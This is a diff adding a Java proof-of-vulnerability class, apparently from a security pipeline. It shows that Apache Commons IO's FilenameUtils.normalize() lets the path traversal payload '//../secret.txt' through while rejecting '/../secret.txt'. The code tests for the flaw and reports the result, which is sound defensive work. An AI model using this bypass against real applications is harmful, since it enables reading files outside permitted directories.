+package security.pipeline.pov;
+
+import org.apache.commons.io.FilenameUtils;
+
+/**
+ * Proof-of-vulnerability for finding-baa9ff67bca0 (CWE-22, CVE-2021-29425-style).
+ *
+ * Root cause (sink): {@code FilenameUtils.doNormalize(String, char, boolean)} in
+ * {@code src/main/java/org/apache/commons/io/FilenameUtils.java}, driven by
+ * {@code FilenameUtils.getPrefixLength(String)}.
+ *
+ * Trust boundary: any caller that treats a user-supplied path string as untrusted
+ * input and calls {@link FilenameUtils#normalize(String)} to decide whether that
+ * path is allowed to be used (the documented contract is: "If the double dot has
+ * no parent path segment to work with, null is returned" -- i.e. normalize()
+ * returning {@code null} is the signal that the path attempts to escape above the
+ * filesystem root and must be rejected).
+ *
+ * Bug: {@code getPrefixLength()} treats a path beginning with two separators
+ * followed by ".." (e.g. "//../secret.txt") as a Windows UNC prefix whose
+ * "server name" component is literally "..", instead of as a relative up-level
+ * reference. Because that leading ".." gets absorbed into the computed prefix,
+ * the double-dot collapsing loop in {@code doNormalize} (which only scans
+ * starting at {@code prefix + 2}) never inspects it. The single-leading-slash
+ * form "/../secret.txt" is correctly rejected (normalize returns null), but the
+ * functionally-equivalent double-leading-slash form "//../secret.txt" is passed
+ * through unchanged and non-null, silently defeating any security gate built on
+ * "reject when normalize() == null".
+ *
+ * This same root cause affects every caller path enumerated in the alert that
+ * ultimately consumes {@code FilenameUtils.normalize(...)} output as a path
+ * (including {@code FileSystemUtils}'s command-array construction at lines
+ * 274/282/304/313 which embeds the unnormalized/mis-normalized path into a
+ * shell command array) -- this PoV targets the normalize() root cause directly
+ * since every other sink in the alert is downstream of the same defect.
+ */
+public final class PathTraversalPOV {
+
+    /**
+     * Mirrors the standard caller-side security gate documented on
+     * FilenameUtils.normalize(): reject the path if normalize() cannot fully
+     * resolve it (returns null).
+     */
+    private static boolean isRejectedAsUnsafe(String userSuppliedPath) {
+        return FilenameUtils.normalize(userSuppliedPath) == null;
+    }
+
+    public static void main(String[] args) {
+        // Baseline: a single leading slash before ".." with no parent segment.
+        // Per FilenameUtils' own javadoc example ("/../"  -->  null) this MUST
+        // be rejected, and it is, on both vulnerable and patched code.
+        final String blockedBaseline = "/../secret.txt";
+
+        // Bypass payload: identical traversal attempt, just prefixed with one
+        // extra leading separator. Semantically it is still "go up one level
+        // from nothing, then read secret.txt" -- there is no legitimate UNC
+        // server named "..".
+        final String bypassPayload = "//../secret.txt";
+
+        final boolean baselineRejected = isRejectedAsUnsafe(blockedBaseline);
+        final boolean payloadRejected = isRejectedAsUnsafe(bypassPayload);
+        final String normalizedPayload = FilenameUtils.normalize(bypassPayload);
+
+        System.out.println("normalize(\"" + blockedBaseline + "\") rejected = " + baselineRejected);
+        System.out.println("normalize(\"" + bypassPayload + "\") rejected = " + payloadRejected
+                + " -> normalize() returned [" + normalizedPayload + "]");
+
+        if (!baselineRejected) {
+            System.out.println("SANITY FAILURE: the single-slash baseline traversal was not rejected;"
+                    + " PoV assumptions about normalize()'s documented contract are broken.");
+            System.exit(2);
+            return;
+        }
+
+        if (!payloadRejected) {
+            System.out.println("VULNERABLE: FilenameUtils.normalize(\"" + bypassPayload + "\") did not "
+                    + "return null even though the functionally identical \"" + blockedBaseline
+                    + "\" IS rejected. A caller that trusts normalize()==null as its path-traversal "
+                    + "gate is bypassed by prefixing the payload with an extra leading separator.");
+            System.exit(0);
+            return;
+        }
+
+        System.out.println("SAFE: normalize() rejected the bypass payload the same way it rejects the "
+                + "baseline; the CVE-2021-29425-style bypass is not present.");
+        System.exit(1);
+    }
